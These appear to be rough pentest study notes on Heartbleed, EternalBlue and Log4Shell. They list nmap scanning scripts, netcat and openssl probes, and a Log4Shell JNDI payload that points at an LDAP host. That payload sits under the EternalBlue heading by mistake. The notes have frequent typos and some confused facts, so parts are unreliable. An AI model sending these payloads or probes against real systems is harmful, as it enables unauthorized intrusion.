Risk Management -> Vulnerability Management -> Vulnerability Assessment -> Penetration Test

NIST: National Vulnerability Database

Fix machine vulnerability if that is identified in the risk management process

## OpenSSL Heartbleed bug (CVE-2014-0160)

Do not handle properly Heartbeat Extension packets, which allows remote attackes to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, by reading private keys.

**Anatomy:** We send a packet as the part of TLS entry so there is a TCP HandShake and the next layer above is the encription connection and as part of that public and private key for each side that will encript a shared private key that is simetric.

```bash

$nmap -sV --sript ssl-enum-ciphers -p443 target

#TLSv1.0, TLSv1.1, TLSv1.2 vulnerable

$nmap -p443 --script ssl-heartbleed target

nc -v domain.com 80 # GET / HTTP/1.0

openssl s_client -connect domain.com:443 # GET / HTTP/1.0

```

## EternalBlue - MS17-010 (CVE-2017-0143)

**_${jndi:ldap://demo.local:1389/mycode}_**

Server fails to parse logged data as str and evaluates JNDI lookup, java naming and directory interface

```bash
# script from nmap: smb-vuln-ms17-010
# EternalBlue attack SMBv1 server, BufferOverflow allows to RCE
$nmap -sV -O demo.local

```

## Log4J - (CVE-2021-44228)

Its useful for login in java.

Attacker can control log messages or log message parameters can execute code from LDAP servers

```bash
$nmap --sript log4shell.nse --script-args log4shell.callback-server=172.17.42.1:1389 -p8080 172.17.42.1
```
